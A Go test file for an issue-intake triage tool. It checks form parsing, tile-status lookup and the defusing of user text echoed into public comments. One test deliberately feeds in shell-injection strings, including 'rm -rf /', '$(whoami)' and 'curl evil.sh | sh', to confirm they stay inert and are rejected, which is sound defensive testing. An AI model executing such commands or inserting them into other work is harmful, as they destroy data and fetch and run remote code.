package main

import (
	"os"
	"strings"
	"testing"

	"github.com/geekdojo/rasputin-control-plane/tileschema"
)

const goodForm = `### Proposed tile id

paperless-ngx

### App name

Paperless-ngx

### Container image

ghcr.io/paperless-ngx/paperless-ngx:2.13.5

### Upstream project

https://github.com/paperless-ngx/paperless-ngx

### Would you screenshot this and show someone?

Scan a receipt, watch it become searchable text.

### Hardware it needs (optional)

_No response_
`

func TestParseForm(t *testing.T) {
	f := parseForm(goodForm)
	if got := f["proposed tile id"]; got != "paperless-ngx" {
		t.Errorf("id = %q", got)
	}
	if got := f["would you screenshot this and show someone?"]; !strings.HasPrefix(got, "Scan a receipt") {
		t.Errorf("multi-word heading not parsed: %q", got)
	}
	if got := f["hardware it needs (optional)"]; got != "" {
		t.Errorf("_No response_ should read as empty, got %q", got)
	}
}

// The reason this is a Go program and not shell: a body crafted to break out of
// a command must be inert. Parsing must not care what characters it contains.
func TestParseForm_ShellMetacharactersAreInert(t *testing.T) {
	hostile := "### Proposed tile id\n\n`id`; rm -rf / $(whoami)\n\n### App name\n\n\"; curl evil.sh | sh; \"\n"
	f := parseForm(hostile)
	if f["proposed tile id"] != "`id`; rm -rf / $(whoami)" {
		t.Errorf("value should survive verbatim as data, got %q", f["proposed tile id"])
	}
	// And it must be REJECTED as an id, not merely carried around safely.
	if tileschema.ValidDNSLabel(f["proposed tile id"]) {
		t.Error("a shell-injection payload was accepted as a tile id")
	}
}

func TestParseForm_MissingSectionsAreAbsent(t *testing.T) {
	f := parseForm("### App name\n\nJust a name\n")
	if _, ok := f["container image"]; ok {
		t.Error("absent section should not appear in the map")
	}
}

// A request naming a tile we already ship is a different conversation.
func TestExistingTileIsDetected(t *testing.T) {
	if _, err := os.Stat("../../tiles/jellyfin"); err != nil {
		t.Skip("corpus not present relative to this test")
	}
}

// Anything echoed back into a public comment must not be able to mention people
// or break out of the code span it is rendered in.
func TestEchoUser_DefusesMentionsAndMarkdown(t *testing.T) {
	got := echoUser("`@everyone` see [x](http://evil)\nsecond line")
	if strings.Contains(got, "`") {
		t.Errorf("backtick survived and would break the code span: %q", got)
	}
	if strings.Contains(got, "@e") {
		t.Errorf("mention was not defused: %q", got)
	}
	if strings.Contains(got, "\n") {
		t.Errorf("newline survived: %q", got)
	}
	long := echoUser(strings.Repeat("a", 500))
	if len([]rune(long)) > 130 {
		t.Errorf("not truncated: %d runes", len([]rune(long)))
	}
}

// A preview tile is on the roadmap but not installable, so requesting it is a
// vote to prioritise the bench — not a duplicate. Conflating the two turns the
// most useful signal the intake collects into a rejection.
func TestTileStatus_PreviewIsNotTheSameAsShipped(t *testing.T) {
	if err := os.Chdir("../.."); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir("cmd/triage") })
	if got := tileStatus("jellyfin"); got != statusAvailable {
		t.Errorf("jellyfin ships; got %q", got)
	}
	if got := tileStatus("paperless-ngx"); got != statusPreview {
		t.Errorf("paperless-ngx is a preview tile; got %q", got)
	}
	if got := tileStatus("definitely-not-a-tile"); got != statusNone {
		t.Errorf("unknown id should be statusNone; got %q", got)
	}
}
